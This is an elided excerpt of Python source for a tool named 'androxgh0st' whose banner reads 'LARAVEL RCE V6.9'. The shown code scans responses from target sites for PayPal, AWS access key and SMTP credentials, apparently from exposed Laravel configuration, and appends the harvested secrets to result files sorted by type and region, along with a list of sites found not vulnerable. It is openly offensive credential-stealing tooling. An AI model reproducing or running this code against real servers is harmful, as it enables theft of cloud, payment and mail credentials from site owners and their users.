...
class androxgh0st:
	def paypal(self, text, url):
		if "PAYPAL_" in text:
			save = open('Result/paypal_sandbox.txt','a')
			save.write(url+'\n')
			save.close()
			return True
		else:
		...
		try:
			if "AWS_ACCESS_KEY_ID" in text:
				...
				if aws_key == "" and aws_sec == "":
					...
					save = open('Result/'+str(aws_reg)[:-2]+'.txt', 'a')
					save.write(remover+'\n\n')
					save.close()
					remover = str(build).replace('\r', '')
					save2 = open('Result/aws_access_key_secret.txt', 'a')
					save2.write(remover+'\n\n')
					save2.close()
				return True
			...
			if "MAIL_HOST" in text:
				...
				if mailuser == "null" or mailpass == "null" or mailuser == "" or mailpass == "":
					...
					if '.amazonaws.com' in mailhost:
						...
						remover = str(build).replace('\r', '')
						save = open('Result/'+getcountry[:-2]+'.txt', 'a')
						save.write(remover+'\n\n')
						save.close()
						remover = str(build).replace('\r', '')
						save2 = open('Result/smtp_aws.txt', 'a')
						save2.write(remover+'\n\n')
						save2.close()
...
def main(url):
	...
	try:
		...
		if resp:
			...
			save = open('Result/not_vulnerable.txt','a')
 ...
 $$  /$$/   _$$$$$  |$$ |  $$ |$$ $$ $$ |$$ | $$ | $$ |
  $$ $$/   /  \__$$ |$$ |  $$ |$$ \$$$$ |$$ | $$ | $$ |
   $$$/    $$    $$/ $$ |  $$ |$$   $$$/ $$ | $$ | $$ |
	...
	LARAVEL \033[32;1mRCE\033[0m V6.9   \n''')
	try:
